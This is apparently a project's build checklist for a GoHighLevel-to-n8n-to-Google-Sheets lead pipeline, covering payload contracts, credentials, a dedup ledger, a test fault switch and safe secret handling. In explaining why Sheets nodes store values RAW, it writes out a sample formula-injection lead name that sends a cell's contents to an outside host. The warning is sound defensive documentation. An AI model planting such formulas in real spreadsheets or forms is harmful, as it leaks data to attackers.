# n8n and Google Sheets — build checklist

Rebuildable checklist for the second half of the pipeline: GHL Opportunity →
GHL Outbound Webhook → n8n Cloud → Google Sheets.

Contains no secrets, no IDs, no URLs, and no real data. Every instance-specific
value is a placeholder you fill in through the UI.

Sibling pages: [operations](operations.md) · [testing](testing.md) ·
[troubleshooting](troubleshooting.md).

## Why the payload contract is declared, not discovered

GoHighLevel's **free** `Webhook (Outbound)` workflow action sends a flat,
snake_case body. Its documented example shows contact fields, a nested
`location` object, and — when the workflow is triggered by an opportunity
event — a group of opportunity fields whose only bare `id` is unlabelled.

Building against that shape would mean building against a schema we cannot
version. So we do the opposite: **the payload contract is declared through
Custom Data**, and n8n reads *only* the keys we declared. GHL's native fields
still arrive; the workflow ignores every one of them.

That choice buys three things: the contract is explicit and reviewable, the
n8n allowlist has something stable to allowlist, and a schema change on GHL's
side cannot silently alter what we persist.

### Two corrections the vendor documentation got wrong

Both were established by reading a real captured delivery on 2026-08-09, not
by reasoning:

1. **Custom Data arrives nested under a `customData` object.** The vendor's
   documented example shows Custom Data keys flattened to the root alongside
   the native fields. They are not. Reading them from the root produced a
   permanent 401 and cost six diagnostic deliveries before the real body was
   inspected. The normalizer now reads `body.customData` and falls back to the
   root, so it survives either shape rather than betting on one.
2. **`contact_id` *does* exist at the root of the real payload**, despite
   being absent from the documented example. We still do not read it — the
   declared `customData.contactId` is the contract — but the claim that GHL
   sends no contact id is false, and any design resting on that premise is
   resting on nothing.

The general lesson, and the reason this section exists: **vendor documentation
is a hypothesis, and a captured payload is evidence.** Where they disagree,
the payload wins.

> **Gotcha: GHL misspells its own field.** The real payload carries
> `pipleline_stage`, not `pipeline_stage`. Anything reading GHL's native
> fields directly must reproduce the typo. This is a second, independent
> reason to read only the declared `customData` keys.

## Constraint that shapes everything downstream

The free action supports **no custom headers, no auth, and no signature**. The
Custom Webhook action that does is premium and billable. So the shared secret
travels **in the body**.

Two consequences, both load-bearing:

1. Any payload captured from a real delivery is **secret-bearing**. It must
   never be committed. `.gitignore` denies `payloads/*.local.json` and
   `payloads/captured*.json` for exactly this reason. The versioned fixture,
   [`payloads/ghl-opportunity-created.example.json`](../../payloads/ghl-opportunity-created.example.json),
   carries a redacted placeholder instead.
2. Replay tooling injects the secret at send time —
   [`scripts/replay-webhook.ps1`](../../scripts/replay-webhook.ps1) — and never
   prints, echoes, or persists it.

Ingress protection is therefore: **an unguessable path, plus a shared secret
in the body, validated before any write of any kind.** That is weaker than a
signature, and it is written down here rather than dressed up.

---

## 1. Google Sheet

One spreadsheet, three tabs, headers in row 1 exactly as below. Sharing stays
**private** — the sheet is reachable only through the bound n8n credential.

| Tab | Headers |
|---|---|
| `leads_backup` | `timestamp,eventId,correlationId,contactId,opportunityId,name,email,phone,business,service,source,stage,appointment,lastAction,status,attempt` |
| `run_log` | `timestamp,correlationId,eventId,contactId,opportunityId,workflow,step,status,attempt,error,outcome` |
| `needs_human` | `timestamp,correlationId,eventId,contactId,opportunityId,reason,status,owner,lastAction` |

`needs_human` was created in P06 and **deliberately unused in that phase**. It
is the destination for TC-08 and TC-12 routing; **TC-12's retry-exhaustion
handoff writes to it as of P08**, TC-08's routing still does not. An empty tab
is honest; a tab quietly written to by nothing is not.

## 2. n8n credential

A single `Google Sheets OAuth2 API` credential, named
`GHL LeadFlow Demo — Google Sheets`, bound in the n8n credential store.

- Used **only** by the native Google Sheets node.
- Never reused in an HTTP Request node. Sending an OAuth token by hand through
  a generic HTTP node puts the token in node parameters, and node parameters
  appear in every export form.

## 3. n8n variable

Create one variable under **Settings → Variables**:

```
GHL_WEBHOOK_SHARED_SECRET
```

Its value is entered directly in the n8n UI and, separately, in the GHL
webhook action's Custom Data. It is never typed into a Code node, an export, a
commit, an Issue, a chat message, or a screenshot.

> **Plan constraint.** n8n documents Variables as available on *Self-hosted
> Enterprise and Pro Cloud* plans, which excludes Cloud Starter. The Cloud free
> trial is separately documented as granting "Pro features capped at 1000
> executions". Those two statements together imply the trial has Variables, but
> no single source says so — **verify it in the workspace before building.**
> If Variables are unavailable, see §7 "Fallback".

## 4. n8n Data Table — the ledger

Create a Data Table named `leadflow_event_ledger` with these columns:

| Column | Type | Meaning |
|---|---|---|
| `eventId` | String | `ghl:opportunity-created:<opportunityId>`. The dedup key. |
| `correlationId` | String | The delivery that most recently touched this row. |
| `opportunityId` | String | For reconciliation back into GHL. |
| `firstSeenAt` | String | ISO-8601. Set on first claim, never overwritten. |
| `status` | String | `claimed` \| `retry_scheduled` \| `completed` \| `failed` |
| `attempt` | Number | Incremented per **delivery** of the same `eventId`. |
| `backupAttempt` | Number | Incremented per **backup write attempt** inside one delivery. Added in P08. |
| `nextAttemptAt` | String | ISO-8601. When the scheduled retry is due. Cleared on completion. Added in P08. |
| `lastError` | String | Why the last attempt failed, truncated to 300 chars. Cleared on completion. Added in P08. |

**`attempt` and `backupAttempt` are not the same number and must not be
merged.** `attempt` counts how many times GHL delivered this event; it is what
makes a redelivery legible. `backupAttempt` counts how many times *we* tried
to write the backup for the current delivery; it is what the retry budget is
spent against. A single delivery that fails twice and then succeeds is
`attempt=1, backupAttempt=3`, and collapsing those into one column would make
"GHL sent it three times" indistinguishable from "we tried three times".

**Do not add an `updatedAt` column.** n8n Data Tables maintain `createdAt` and
`updatedAt` themselves; a user column of the same name is redundant and drifts
from the system value. The design originally specified one — the live table
proved it unnecessary, and the workflow no longer writes it.

The ledger is deliberately **separate from `run_log`**. `run_log` is an
append-only narrative for humans; the ledger is queried state that decides
control flow. Mixing them would mean a logging failure could change behaviour.

## 4b. n8n Data Table — the fault switch (P08)

Create a second Data Table named `leadflow_test_controls`:

| Column | Type | Meaning |
|---|---|---|
| `key` | String | Only `backup_fault` is used today. |
| `mode` | String | `off` \| `always`. Anything else means `off`. |
| `eventScope` | String | Empty arms every delivery. Otherwise only `opportunityId`s **beginning with** this string fail. |
| `note` | String | Why it was flipped, for whoever finds it later. |

This is how TC-10, TC-11 and TC-12 make the downstream write fail on demand.
Three properties of it are deliberate.

**It is not a payload field, and never will be.** The obvious shortcut is a
`simulateFailure` flag in the webhook body. That would hand anyone who can
submit the public form both a denial-of-service lever and a way to push chosen
leads into the human-review queue. The switch lives where only an operator
with n8n access can reach it.

**It is append-only.** n8n's Data Table API exposes row insertion but no row
update, so flipping the switch means appending a new row; `Fault Gate` takes
the highest `id` for the key. That began as a constraint rather than a design
choice, and it turned out better than the mutable flag would have been — the
switch now carries its own history, so "who armed this, when, and why" is
answerable after the fact. The cost is a table that only grows.

**It fails open.** A missing row, an unreadable table, or an unrecognised
`mode` all resolve to `off`. A broken test switch must never be able to take
production down — the failure mode of a safety device has to be the safe one.

**The scope is a prefix on `opportunityId`, and it was a substring on `eventId`
until a review caught it.** `opportunityId` arrives verbatim from the payload,
so a substring match meant that anyone holding the shared secret who also knew
the armed scope could embed it anywhere in an id and push a chosen lead into
the human-review queue. A prefix on the id alone is narrower, and it matches
how the scope is described here — which the substring version did not.

Leave it `off`. The last row appended during P08 says exactly that, and
`run_log` plus the table's own history are how you check rather than assume.

## 5. Import the workflow

Import [`n8n/workflows/ghl-opportunity-to-sheets.sanitized.json`](../../n8n/workflows/ghl-opportunity-to-sheets.sanitized.json).

The export is sanitized, so four things are placeholders and **must** be
re-picked in the UI after import. This is not import breakage — it is the
sanitization working:

| Placeholder | Where | What to do |
|---|---|---|
| `REPLACE_WITH_UNGUESSABLE_PATH` | `Webhook` node, `path` | Replace with a freshly generated UUID. Not a guessable word. |
| `REPLACE_WITH_SHEET_ID` | all 9 Google Sheets nodes | Pick the spreadsheet from the credential-backed dropdown. |
| `REPLACE_WITH_LEDGER_DATA_TABLE_ID` | the 4 ledger Data Table nodes | Pick `leadflow_event_ledger`. |
| `REPLACE_WITH_CONTROLS_DATA_TABLE_ID` | `Fault Gate: Read Control` | Pick `leadflow_test_controls`. |
| *(no credential bound)* | all 9 Google Sheets nodes | Select `GHL LeadFlow Demo — Google Sheets`. |

> **Do not drop `options.cellFormat: "RAW"` from any Sheets node.** The node
> defaults `cellFormat` to `USER_ENTERED`, which interprets a value exactly as
> if a person had typed it — so text beginning `=`, `+`, `-`, or `@` is stored
> as a **live formula**, not as text.
>
> That is reachable by an attacker who holds no secret at all. The lead form is
> public; a submitted name of `=IMAGE("https://…"&A1)` travels to GHL, GHL
> attaches the *correct* shared secret and delivers it, ingress authorises it
> legitimately, and the formula lands in the durable backup. `RAW` stores every
> value literally and closes it.

The export ships `RAW` on all nine Sheets nodes. Verify after import — a
re-picked node can silently reset its options.

> **`RAW` does not travel with the data.** It governs how Sheets *stores* the
> value, not how another program later *reads* it. Export `leads_backup` to CSV
> or XLSX and open it in Excel or LibreOffice and a leading `=`, `+`, `-`, or
> `@` is re-parsed as a formula at import time, no matter how it was stored.
> Anyone exporting this sheet must import the columns as text.

Then **Save and Activate**, and copy the **Production** webhook URL. The Test
URL expires after 120 seconds and will die mid-demo.

**Saving is not publishing.** Editing and saving writes a draft; the production
webhook keeps serving the previously published version. This is the single most
expensive trap in this build — the full account and the two rules that follow
from it are in [operations](operations.md) §1.

## 6. GHL workflow — `LeadFlow Demo — Opportunity to n8n`

A **separate** workflow from `LeadFlow Demo — Form to Opportunity`, so a
manually created or reconciled Opportunity fires the webhook too.

1. **Trigger:** `Opportunity Created`, filtered to pipeline
   `LeadFlow Demo Pipeline` and stage `New Lead`.
2. **Speed-to-lead action:** an **internal task or notification only**. No SMS,
   no email, no premium/billable action. The demo must not send real messages.
3. **Action:** `Webhook (Outbound)` — the free one. Method `POST`, URL = the
   n8n **Production** URL.
4. **Custom Data:** the declared contract below.
5. **Publish** the workflow.

### Custom Data — the declared payload contract

| Key | Value |
|---|---|
| `sharedSecret` | the shared secret, typed directly (static text) |
| `eventType` | `opportunity.created` (static text) |
| `contactId` | Contact Id — **from the merge-field picker** |
| `opportunityId` | Opportunity Id — **from the merge-field picker** |
| `name` | contact full name — picker |
| `email` | contact email — picker |
| `phone` | contact phone — picker |
| `business` | contact company/business name — picker |
| `service` | `Service Interest` custom field (`contact.service_interest`) — picker |
| `source` | opportunity source — picker |
| `stage` | pipeline stage — picker |

These eleven keys arrive **nested under `customData`** in the delivered body,
not at the root — see "Two corrections the vendor documentation got wrong"
above. The replay script's `-SecretKey` therefore defaults to the dotted path
`customData.sharedSecret`.

> **Gotcha, already paid for once in P05.** Merge values must be inserted from
> GHL's **merge-field picker**, never typed as the placeholder text the picker
> displays. Typing `[Opportunity Id]` by hand produces a payload whose value is
> literally that bracket text. P05 hit this on the `Create Opportunity` action's
> Name field — see [`ghl-setup.md`](../ghl-setup.md).
>
> The first real delivery is the only thing that proves the tags resolved.
> Inspect the n8n execution body before declaring TC-01 anything.

### Capturing a payload safely

Read the body from the **n8n execution view**, not from a third-party echo
service. Sending this payload to a public request-bin would publish the shared
secret to a host we do not control.

To keep a captured payload for replay, save it as `payloads/captured.local.json`
— already gitignored — and redact the secret before it goes anywhere else.

**It must be the complete HTTP request body and valid JSON on its own.** A
fragment hand-copied out of the n8n UI — starting at `"body": {`, or with
unbalanced braces — is not replayable, and the replay script rejects it rather
than sending something that would test nothing. Prefer downloading the item
JSON over selecting text in the browser, or read the execution through the n8n
API. Verify before relying on it:

```powershell
Get-Content payloads\captured.local.json -Raw | ConvertFrom-Json | Out-Null
```

## 7. Fallback — if n8n Variables are unavailable on the plan

Do **not** inline the secret into a Code node: it would land in every export
form, and this repository is public.

Preferred fallback, in order:

1. **A credential-bound value.** Create a `Header Auth` credential whose value
   is the shared secret and reference it from a node that consumes credentials.
   Credential values are stored encrypted and are excluded from normal exports.
2. **A one-row n8n Data Table** holding the expected secret, read at the start
   of the run. Weaker — it puts the secret in queryable application data — but
   it keeps it out of the workflow definition.

Both are worse than a Variable. If neither is available, stop and re-scope the
ingress protection rather than shipping a workflow with a literal secret.

## Related

- [operations](operations.md) — publishing, the response contract, retry, reconciliation, limitations
- [testing](testing.md) — how the scenarios are executed
- [troubleshooting](troubleshooting.md) — when every delivery returns 401
- [`../ghl-setup.md`](../ghl-setup.md) — the GHL side of this pipeline
- [`../architecture.md`](../architecture.md) §6 — identity and idempotency
- [`../decisions/ADR-002-idempotency-strategy.md`](../decisions/ADR-002-idempotency-strategy.md) — why the ledger is ordered the way it is
- [`../integration-options.md`](../integration-options.md) §3–4 — hosting decision
</content>
